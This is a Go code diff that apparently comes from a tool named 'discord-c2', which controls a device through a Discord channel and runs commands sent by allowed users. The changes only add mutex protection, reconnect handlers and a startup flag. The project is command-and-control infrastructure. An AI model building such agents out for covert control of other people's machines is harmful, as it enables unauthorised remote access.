@@ -11,6 +11,8 @@ import (
 	"os/user"
 	"runtime"
 	"strings"
+	"sync"
+	"sync/atomic"
 	"syscall"
 
 	"discord-c2/internal/audit"
@@ -25,7 +27,9 @@ import (
 )
 
 var (
-	// channelID is the Discord text channel associated with this device.
+	// channelID is the Discord text channel associated with this device. It is
+	// guarded by channelMu because the reconnect watchdog may update it.
+	channelMu sync.RWMutex
 	channelID string
 	// guildID is the Discord guild in which device channels and commands live.
 	guildID string
@@ -33,7 +37,24 @@ var (
 	allowedUsers map[string]bool
 	// jobManager owns asynchronous command execution for this process.
 	jobManager *jobs.Manager
+	// startupComplete becomes true once the initial banner and channel are set.
+	startupComplete atomic.Bool
+	// reconcileMu serializes reconnect reconciliation.
+	reconcileMu sync.Mutex
 )
+
+func deviceChannel() string {
+	channelMu.RLock()
+	defer channelMu.RUnlock()
+	return channelID
+}
+
+func setDeviceChannel(id string) {
+	channelMu.Lock()
+	channelID = id
+	channelMu.Unlock()
+	commands.SetChannel(id)
+}
 
 func userAllowed(id string) bool {
 	return len(allowedUsers) == 0 || allowedUsers[id]
@@ -65,6 +86,9 @@ func Run(cfg config.Config) error {
 
 	dg.AddHandler(handler)
 	dg.AddHandler(commands.Handle)
+	dg.AddHandler(onReady)
+	dg.AddHandler(onResumed)
+	dg.AddHandler(onDisconnect)
 	// GuildMessages is required for channel traffic; MessageContent lets the
 	// message shortcut handler read commands from the device channel.
 	dg.Identify.Intents = discordgo.IntentsGuildMessages | discordgo.IntentsMessageContent
@@ -108,8 +132,7 @@ func Run(cfg config.Config) error {
 		return fmt.Errorf("ensure device channel %s: %w", channelName, err)
 	}
 
-	channelID = chID
-	commands.SetChannel(chID)
+	setDeviceChannel(chID)
 	logstream.Enable(dg, chID)
 	log.Printf("log streaming enabled for channel %s on connect", chID)
 
@@ -147,6 +170,8 @@ func Run(cfg config.Config) error {
 	// Register after the channel is usable and off the startup path: Discord
 	// rate-limits command updates and a slow sync must not block control.
 	go registerCommands(dg)
+
+	startupComplete.Store(true)
 
 	sc := make(chan os.Signal, 1)
 	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
